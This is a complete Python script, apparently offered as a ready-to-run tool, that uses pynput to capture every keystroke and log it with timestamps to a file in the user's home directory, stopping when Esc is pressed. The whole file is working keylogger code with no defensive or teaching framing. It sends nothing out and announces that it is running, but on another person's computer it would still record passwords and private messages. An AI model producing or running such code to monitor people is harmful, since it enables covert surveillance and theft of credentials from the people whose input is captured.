# keylogger.py

import logging
from pynput import keyboard
import os

# Set up logging to write to a file
log_dir = os.path.expanduser("~")  # Log the keylogger file in the user's home directory
log_file = os.path.join(log_dir, 'keylogger.log')

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log the pressed key
def on_press(key):
    try:
        # Log the key as a character
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Handle special keys (e.g., Ctrl, Alt, etc.)
        logging.info(f'Special key {key} pressed')

# Function to log when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener if Esc key is pressed
        return False

# Start the listener
def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print(f"Keylogger is running... Log file is saved at {log_file}")
    start_keylogger()
